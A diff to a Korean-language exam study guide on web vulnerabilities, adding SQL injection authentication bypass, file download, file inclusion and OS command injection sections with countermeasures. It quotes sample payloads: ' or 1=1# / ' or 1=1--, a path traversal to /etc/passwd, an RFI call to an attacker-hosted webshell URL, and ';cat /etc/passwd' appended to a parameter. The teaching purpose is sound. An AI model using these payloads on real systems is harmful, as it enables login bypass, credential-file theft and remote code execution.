@@ -79,6 +79,31 @@ ResultSet rs = pstmt.executeQuery();                         // (D)
 | Blind SQL Injection | 오류 메시지 없이 참/거짓 응답 차이를 이용하여 데이터 추출 |
 | Error-based SQL Injection | 의도적 오류 메시지에 데이터를 포함시켜 추출 |
 | Time-based Blind SQL Injection | SLEEP() 함수로 응답 지연 여부로 데이터 추론 |
+| Form SQL Injection | HTML Form 기반 인증을 담당하는 애플리케이션의 취약점을 이용해, 질의문의 조건절(WHERE절)이 항상 참이 되도록 사용자 인증 질의문의 조건을 임의로 조작하여 인증을 우회하는 기법. 공격이 성공하면 반환되는 레코드 셋의 첫 번째 레코드에 해당하는 사용자 권한을 획득 |
+
+**데이터베이스별 주석 처리 문자 (SQL Injection 실무 핵심)**
+
+공격 대상 DB마다 주석 처리 문자가 다르므로 공격 수행 시 대상 DBMS에 맞는 주석 문자를 사용해야 합니다.
+
+| DBMS | 여러 줄 주석 | 한 줄 주석 | 예시 |
+|---|---|---|---|
+| MySQL | `/* 주석 */` | `#` 주석 | `select * from member where id='' or 1=1#' and pass='1234'` |
+| MS-SQL | `/* 주석 */` | `--` 주석 | `select * from member where id='' or 1=1--' and pass='1234'` |
+| Oracle | `/* 주석 */` | `--` 주석 | `select * from member where id='' or 1=1--' and pass='1234'` |
+
+!!! important "핵심"
+    `' or 1=1#`(MySQL) 또는 `' or 1=1--`(MS-SQL·Oracle) — WHERE절을 항상 참으로 만드는 `' or 1=1`은 공통이지만, 뒤에 오는 나머지 질의문(비밀번호 조건 등)을 무력화하는 **주석 문자는 DB마다 다르다**는 점이 실무형 문제의 핵심 포인트입니다.
+
+**SQL Injection 공격 시 자주 쓰이는 URL 인코딩(Percent Encoding)**
+
+| 문자 | 16진수 | 문자 | 16진수 |
+|---|---|---|---|
+| `<` `=` `>` | 0x3C, 0x3D, 0x3E | `#` | 0x23 |
+| `'` `"` | 0x27, 0x22 | `-` | 0x2D |
+| space(공백) | 0x20 (또는 `+`) | `;` | 0x3B |
+| `,` | 0x2C | NULL 문자 | 0x00 |
+
+**무료 SQL Injection 취약점 스캐너**: Nikto(웹서버 및 SQL Injection 취약점 점검, 리눅스 기반) / SQLMap(블라인드 SQL Injection 자동 수행, Python 개발) / Absinthe(GUI 기반, 블라인드 SQL Injection 취약점을 이용해 DB 스키마·목록을 자동화 다운로드)
 
 ### 2-4. SQL Injection 대응 방법
 
@@ -192,7 +217,15 @@ public String boardWrite(@ModelAttribute BoardModel boardModel, HttpSession sess
 - 내부 네트워크 주소(RFC1918), 루프백 주소(127.0.0.1) 접근 차단
 - URL 파싱 후 최종 도달 주소 검증 (리다이렉트 추적)
 
-## 6. 파일 업로드 취약점 (25년도 2회)
+!!! important "CSRF 취약점과 SSRF 취약점의 차이 (필수 구분)"
+    두 취약점 모두 "위조된 요청"을 이용하지만 **요청을 발생시키는 주체**가 다릅니다.
+
+    - **CSRF**: 공격자가 정상적인 사용자의 요청 정보를 조작하여 웹사이트에서 사용자의 권한으로 악의적인 행위를 수행 — 조작된 요청 발생 주체는 **사용자(클라이언트)**
+    - **SSRF**: 공격자가 요청 정보를 조작하여 웹서버가 내부 서버에 조작된 요청을 하도록 하여 정보 탈취 등을 수행 — 조작된 요청 발생 주체는 **웹서버(웹 애플리케이션)**
+
+    SSRF는 2021년 OWASP Top 10에 신규 추가된 항목입니다.
+
+## 6. 파일 계열 취약점 (업로드·다운로드·삽입) & OS Command Injection
 
 > 출제 이유: 실무에서 매우 흔한 취약점으로 우회 기법과 공격 성공 조건이 상세히 출제됩니다.
 
@@ -220,6 +253,35 @@ public String boardWrite(@ModelAttribute BoardModel boardModel, HttpSession sess
 - 업로드 디렉터리의 스크립트 실행 권한 제거 (Apache: `Options -ExecCGI`)
 - 업로드 디렉터리를 웹 루트 외부에 위치
 - 파일 크기 제한
+
+### 6-5. 파일 다운로드(File Download) 취약점
+
+| 항목 | 내용 |
+|---|---|
+| 정의 | 파일 다운로드 기능이 존재하는 웹 애플리케이션에서 파일 다운로드 시 파일 경로 및 파일명을 파라미터로 받아 처리하는 경우, 이를 적절히 필터링하지 않으면 공격자가 이를 조작(경로 및 파일명 조작)하여 허용되지 않은 파일(시스템 환경설정 파일, 소스 코드 파일, DB 연동 파일 등)을 다운받을 수 있는 취약점 |
+| 실습 예시 | 다운로드 URL의 `real_name`(실제 저장된 파일명) 파라미터를 `../../../../etc/passwd`처럼 상대경로로 조작 |
+| 경로 이동 문자 | 유닉스/리눅스: `../`(상위 디렉터리), `./`(현재 디렉터리) / 윈도우: `..\`(상위 디렉터리), `.\`(현재 디렉터리) |
+| 대응 | 다운로드 대상 파일 경로를 화이트리스트로 관리(사용자 입력이 실제 파일 경로에 직접 반영되지 않도록 별도 매핑 테이블 사용) / 경로 조작 문자열(`../`, `..\`) 필터링 / 다운로드 대상 디렉터리를 제한 |
+
+### 6-6. 파일 삽입(File Inclusion) 취약점
+
+| 항목 | 내용 |
+|---|---|
+| 정의 | 공격자가 악성 서버 스크립트를 서버에 전달하여, 해당 페이지를 통해 악성코드가 실행되도록 하는 취약점. PHP의 `include()`·`require()` 함수처럼 지정한 파일(페이지)을 현재 페이지에 포함해 실행시켜주는 함수에, 파일 경로를 외부로부터 입력받을 때 적절한 검증을 하지 않으면 발생 |
+| 분류 | 삽입할 악성 스크립트 파일의 위치가 **로컬 서버**에 위치하는지, **원격지**에 위치하는지에 따라 LFI(Local File Inclusion)와 RFI(Remote File Inclusion)로 구분 |
+| RFI 공격 예시 | 파라미터에 원격 웹쉘 URL을 전달(`?fname=http://공격자서버/webshell.php`)하여, include 함수가 원격 서버의 웹쉘 스크립트를 그대로 실행하도록 유도 |
+| `include` vs `require` | `include`: 파일이 없어 오류가 발생해도 나머지 코드는 계속 실행 / `require`: 파일이 없어 오류가 발생하면 즉시 스크립트 실행 중단 |
+| 대응 | 파일 경로를 외부 입력값으로 직접 구성하지 않고 화이트리스트(허용 목록)로 제한 / `allow_url_include`(PHP 설정) 비활성화로 RFI 원천 차단 |
+
+### 6-7. 운영체제 명령 실행(OS Command Injection) 취약점
+
+| 항목 | 내용 |
+|---|---|
+| 정의 | 적절한 검증 절차를 거치지 않은 사용자 입력값이 운영체제 명령어의 일부 또는 전부로 구성되어 실행되는 경우, 의도하지 않은 시스템 명령어가 실행되어 부적절하게 권한이 변경되거나 시스템 동작·운영에 악영향을 미칠 수 있는 취약점. 소프트웨어 개발보안 가이드라인에서는 "운영체제 명령어 삽입(OS Command Injection)" 보안약점으로 정의 |
+| 원리 | 웹 애플리케이션에서 `system()`, `exec()`와 같은 시스템 명령어를 실행할 수 있는 함수를 제공하며, 사용자 입력값에 대한 필터링이 제대로 이루어지지 않을 경우 공격자가 시스템 명령어를 호출 |
+| 공격 예시 | ping 테스트 기능(`?ip=127.0.0.1`)에 세미콜론(`;`)으로 명령어를 추가 삽입 — `?ip=127.0.0.1;cat /etc/passwd` → ping 명령 뒤에 이어서 `cat /etc/passwd` 명령이 함께 실행되어 시스템 파일 유출 |
+| 피해 | 시스템 계정 정보 유출, 백도어 설치, 관리자 권한 탈취 |
+| 대응 | 사용자 입력값에서 `;`, `|`, `&`, `` ` `` 등 명령어 구분자·특수문자 필터링 / 시스템 명령어 실행 함수(system, exec 등) 사용 자제, 부득이한 경우 화이트리스트 기반 인자 검증 / 최소 권한으로 웹서버 프로세스 실행 |
 
 ## 7. 기타 웹 취약점
 
@@ -390,6 +452,12 @@ public String boardWrite(@ModelAttribute BoardModel boardModel, HttpSession sess
 | SSRF 필터링 | 화이트리스트(기본) → 블랙리스트(무작위 입력 시) |
 | 파일 업로드 우회 | Content-Type 헤더를 image/gif 등으로 변조 |
 | 파일 업로드 대응 | 확장자 화이트리스트 + 실행 권한 제거 + 웹루트 외부 저장 |
+| SQLi DB별 주석문자 | MySQL=# / MS-SQL·Oracle=-- (여러줄은 공통 `/* */`) |
+| SQLi 무료 스캐너 | Nikto(웹서버 전반) / SQLMap(블라인드 자동화) / Absinthe(GUI) |
+| CSRF vs SSRF | 조작 요청 발생 주체 — CSRF=사용자(클라이언트) / SSRF=웹서버 |
+| 파일 다운로드 취약점 | 경로 파라미터 조작(../, ..\\)으로 임의 파일 다운로드 |
+| LFI vs RFI | Local(로컬 서버 파일) vs Remote(원격지 파일), PHP include/require |
+| OS Command Injection | `;`로 명령어 연결 삽입, system()/exec() 필터링 미흡 |
 | 쿠키 보안 3속성 | HttpOnly(JS 차단) / Secure(HTTPS만) / SameSite(CSRF 방지) |
 | HTTP Request Smuggling | Content-Length vs Transfer-Encoding 불일치 악용 |
 | HTTP 응답 분할 | CR(%0D) + LF(%0A) 삽입 |
